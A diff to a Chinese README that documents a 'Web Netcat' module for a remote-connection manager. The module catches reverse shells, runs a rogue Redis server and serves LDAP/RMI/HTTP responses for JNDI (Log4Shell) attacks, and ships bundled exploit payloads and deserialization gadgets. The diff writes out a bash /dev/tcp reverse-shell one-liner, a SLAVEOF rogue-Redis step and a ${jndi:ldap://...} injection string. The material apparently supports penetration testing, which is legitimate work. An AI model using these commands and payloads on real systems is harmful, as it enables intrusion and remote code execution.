@@ -63,6 +63,80 @@
 - 密钥可编辑：改名称、改私钥正文、改公钥；改名会同步更新所有引用该密钥的连接配置，改正文会校验是否是合法私钥。
 - 识别加密私钥（带 passphrase）：列表标记「（加密）」，连接时在密码栏填入口令即可。
 
+### Web Netcat（端口监听 / 反弹 Shell / 特征应答）
+
+浏览器里直接管理一组 TCP 监听端口：把接入的连接当成反弹 shell 终端操作，或按「请求特征 → payload」规则自动应答 Exp。
+
+- **入口**：三种方式都能建监听 —— ①顶栏「+ 新建连接」把类型选成「Netcat 监听（Web Netcat）」，直接在弹窗里配监听端口、模式、自动命令集和规则；②顶栏「网络监听」弹窗里点「+ 新建监听」（高级参数更全）；③监听保存后会像其它连接一样出现在卡片区，卡片右侧可直接启停 / 编辑 / 删除，点卡片进监听详情和会话终端。
+- **监听管理**：任意端口、任意模式，支持新建 / 编辑 / 启停 / 删除；配置持久化在 `data/netcat.json`，勾选「保存后立即启动」的监听在服务重启时会自动恢复。同一端口不允许被两个监听占用，绑定失败会在界面上显示原因。
+- **浏览器终端**：每个接入连接都是一条会话，点「终端」即在网页里用 xterm 操作；进入时先回放该会话此前的输出（最长 512 KB），之后实时双向透传。终端下方还提供命令输入框，按回车即下发（无 WebSocket 时走 REST `exec`）。断开会话会立即关闭 TCP 连接。
+- **自动命令集**（`shell` 模式）：连接建立后按配置自动下发命令，每行一条：
+  - `id` —— 立即发送；
+  - `uname -a | 300` —— 等 300 ms 再发；
+  - `cat /etc/passwd @ \$` —— 等输出命中正则 `\$` 后再发（默认最多等 10 s）。
+  - 命令会自动补换行；每条下发都会写进事件流水，便于复盘。
+- **规则引擎（核心）**：一个监听可同时挂多条规则，任意一条命中即推送对应 payload：
+  - 匹配方式：`contains`（子串，默认）、`prefix`（连接开头）、`suffix`、`regex`（正则）、`hex`（十六进制字节，如 `00 01 02`）；
+  - 匹配窗口默认 4 KB，**跨 TCP 分片也能命中**（如先发 `exp.` 再发 `so`）；命中后清空窗口，同一段数据不会重复触发，新数据仍可再次命中；
+  - 载荷来源：`text`、`base64`、`file`（引用 `data/netcat-payloads/` 下的文件，如 `exp.so`、`Exploit.class`、`gadget.jar`）；
+  - 发送包装：原样发送，或 `bulk`（Redis 协议 `$<len>\r\n...\r\n`，用于下发模块 / RDB）；
+  - 每连接命中次数上限、命中后延迟发送、发送完成是否主动断开，都可单独配置；
+  - 所有命中与推送都记录在「事件」页签（时间、来源 IP、命中的规则、发送字节数）。
+- **服务类型内置应答**（规则之外再叠加协议层应答，两者可同时生效）：
+
+| 模式 | 内置行为 |
+| --- | --- |
+| `shell` | 反弹 shell 终端：浏览器交互 + 自动命令集 |
+| `raw` | 只发 banner、按规则应答，适合蜜罐 / 通用端口 |
+| `redis` | Rogue Server：`PING → +PONG`、`REPLCONF/AUTH/SELECT/... → +OK`、`INFO` 返回伪造信息、`PSYNC → +FULLRESYNC` 并下发默认 payload；配合规则（特征 `exp.so` / `PSYNC`，包装 `bulk`）即可完成 `exp.so` 模块投递 |
+| `ldap` | 最小可用 LDAPv3：`BindRequest → success`，`SearchRequest → SearchResultEntry`（`javaClassName` / `javaFactory` / `javaCodeBase` / `javaReferenceAddress` / `javaSerializedData`）+ `SearchResultDone`；也可配置 Referral（`resultCode 10`）让客户端改连其它 LDAP/RMI |
+| `rmi` | 回 `JRMI` 协议头，收到客户端数据后发送配置的原始载荷（base64 或文件），适合投递序列化 gadget |
+| `http` | JNDI CodeBase 服务：按请求路径返回 `data/netcat-payloads/` 里的文件（`.class` 自动 `application/java-vm`、`.jar` 为 `application/java-archive`），未命中时返回配置的固定响应 |
+
+- **Payload 文件管理**：界面右上「Payload 文件」可上传 / 删除二进制载荷，规则与服务应答按文件名引用，不用重启。
+- **典型用法**：
+
+```bash
+# 1) 反弹 shell：监听 8888（shell 模式），目标机执行
+bash -c 'bash -i >& /dev/tcp/<服务端IP>/8888 0>&1'
+
+# 2) Redis Rogue：监听 6379（redis 模式），规则「exp.so 请求」→ 文件 exp.so，包装 bulk
+#    受害机 redis-cli 执行 SLAVEOF <服务端IP> 6379 后，模块即被写入其工作目录
+
+# 3) Log4Shell / JNDI：
+#    - ldap 监听 1389：javaCodeBase=http://<服务端IP>:8081/
+#    - http 监听 8081：serve_payload_dir=true，上传 Exploit.class
+#    - 触发点注入 ${jndi:ldap://<服务端IP>:1389/Exploit}
+```
+
+#### 内置 Exp Payload（`payloads/`）
+
+仓库自带一组可直接用的 exp 载荷，启动时自动复制到 `data/netcat-payloads/`（同名文件已存在则保留，不覆盖你上传的），规则 / LDAP / RMI 直接按文件名引用即可：
+
+| 文件 | 用途 |
+| --- | --- |
+| `exp.so` | Redis Rogue 模块（x86-64 ELF，`MODULE LOAD ./exp.so` 后可用 `shell.exec "命令"`），随附 `exp.c.example` / `exp.so-README.md` |
+| `Exploit.class` | JNDI 远程类（Log4Shell 等 LDAP/RMI 注入，CodeBase 直接下载执行） |
+| `JNDIObject.class` / `FileDownloader.class` | LDAP Reference 的 ObjectFactory / 远程下载类 |
+| `spark-rce.jar` / `yaml-rce.jar` | CodeBase 指向 jar 的场景（`javaCodeBase=.../jar` + `javaClassName`） |
+| `cc1` / `cc6` / `cc9` / `cb1` | Java 反序列化 gadget（CommonsCollections / CommonsBeanutils），用于 RMI 模式直接发送 |
+| `JRMPClient2_LdapUrl` | JRMPClient 载荷（让目标回连指定 LDAP） |
+
+种子监听（首次启动生成；redis / ldap / http / rmi 默认自启，反弹 shell 需手动启动）：
+
+| 端口 | 模式 | 已配置内容 |
+| --- | --- | --- |
+| 8888 | shell | 自动下发 `id` / `uname -a` / `pwd`，浏览器终端接管 |
+| 6379 | redis | Rogue 应答 + 两条规则（`exp.so` 请求、`PSYNC`）→ 文件 `exp.so`、`bulk` 包装 |
+| 1389 | ldap | JNDI Reference：`javaClassName/javaFactory=Exploit`，`javaCodeBase=http://$NETCAT_PUBLIC_HOST:8090/` |
+| 8090 | http | JNDI CodeBase 文件服务（`/Exploit.class`、`/exp.so` 按路径返回） |
+| 1099 | rmi | 回 `JRMI` 头后发送 `cc6` 序列化载荷（换成别的文件即换 gadget） |
+
+- `NETCAT_PUBLIC_HOST`：生成 LDAP 的 `javaCodeBase` 用的对外主机，默认 `127.0.0.1`；容器/局域网打靶时在 `.env` 或环境里设成目标机能访问到的本机 IP，例如 `NETCAT_PUBLIC_HOST=192.168.0.123`。
+- Docker 部署已映射 `8888 / 6379 / 1389 / 8090 / 1099` 与 `9000-9010`，换端口时同步改 `docker-compose.yml`。
+
+> 监听端口是**对外开放的服务**：只在需要的网络环境里启停，用完即停；不要在没有防护的情况下把 shell / LDAP / Redis 监听暴露到公网。所有接入会话都能被任何打开本页面的人接管，请自行加访问控制（反向代理鉴权、VPN、安全组）。
+
 ### VNC / RDP / Telnet
 
 - VNC 走 WebSocket 裸转发到 noVNC 客户端；服务器需要密码时自动使用配置里保存的密码。
@@ -132,6 +206,7 @@ remote-connect-manager/
 │   ├── vnc/                    # VNC WebSocket 裸转发
 │   ├── rdp/                    # RDP / Telnet：guacd 握手与双向透传
 │   ├── rdpdrive/               # RDP 共享盘浏览与下载 API
+│   ├── netcat/                 # Web Netcat：端口监听、规则应答、反弹 shell 终端、LDAP/Redis/RMI/HTTP 应答
 │   ├── screenshot/             # 截图落盘与旧图清理
 │   └── testutil/               # 单元测试用的内存 SSH / SFTP 服务端
 ├── web/
@@ -307,8 +382,13 @@ data/
 │   ├── id_rsa            # 私钥（文件名即密钥名）
 │   ├── id_rsa.pub        # 公钥
 │   └── .manifest.json    # 密钥来源记录：{ "id_rsa": "/Users/you/.ssh/id_rsa" }
-└── screenshots/          # 卡片背景图：<连接ID>_<纳秒时间戳>.jpg|png（每连接只保留最新一张）
+├── screenshots/          # 卡片背景图：<连接ID>_<纳秒时间戳>.jpg|png（每连接只保留最新一张）
+├── netcat.json           # Web Netcat 监听配置（端口、模式、规则、自动命令集）
+├── netcat-payloads/      # 规则 / CodeBase 引用的 payload（启动时从仓库 payloads/ 自动灌入）
 ```
+
+项目根 `payloads/` 是随镜像发布的载荷源（`exp.so`、`Exploit.class`、`spark-rce.jar`、`cc1/cc6/cc9/cb1` 等），见「内置 Exp Payload」。
+
 
 ### 连接配置（`data/connections.db`）
 
@@ -370,6 +450,8 @@ data/
 | `SSH_SCAN_DIR` | `/host-ssh` → `$HOME/.ssh` | 启动时扫描导入密钥的目录 |
 | `GIN_MODE` | `debug` | 设为 `release` 关闭调试日志 |
 
+> Web Netcat 的监听端口由每个监听自己配置（1-65535），与 `PORT` 无关；Docker 部署时需要在 compose 里把这些端口映射到宿主机，否则外部连不进来。
+
 ## API 一览
 
 | 方法 | 路径 | 说明 |
@@ -389,7 +471,15 @@ data/
 | DELETE | `/api/tunnels/:id` | 关闭隧道 |
 | GET | `/api/rdp-drive/list?path=` | 列出 RDP 共享盘（guacd `drive-path`）目录 |
 | GET | `/api/rdp-drive/download?path=` | 下载共享盘文件（支持 Range） |
+| GET/POST | `/api/netcat/listeners` | 网络监听列表（含运行状态、统计数据）/ 新建监听 |
+| PUT/DELETE | `/api/netcat/listeners/:id` | 修改（运行中会重启生效）/ 删除监听 |
+| POST | `/api/netcat/listeners/:id/start`、`/stop` | 启停监听 |
+| GET | `/api/netcat/listeners/:id/sessions`、`/events` | 该监听的会话列表 / 事件流水 |
+| GET/DELETE | `/api/netcat/sessions`、`/api/netcat/sessions/:id` | 全部会话 / 断开指定会话 |
+| POST | `/api/netcat/sessions/:id/exec` | 在会话里执行命令（`{"cmd":"id"}`） |
+| GET/POST/DELETE | `/api/netcat/payloads`、`/api/netcat/payloads/:name` | 列出 / 上传（multipart `file`）/ 删除 payload 文件 |
 | WS | `/ws/ssh/:id`、`/ws/vnc/:id`、`/ws/guacamole/:id`、`/ws/telnet/:id` | SSH / VNC / RDP / Telnet 会话通道 |
+| WS | `/ws/netcat/:sessionId` | 把浏览器终端挂到某条 nc 会话（先回放历史，再双向透传） |
 
 ## 常见问题
 
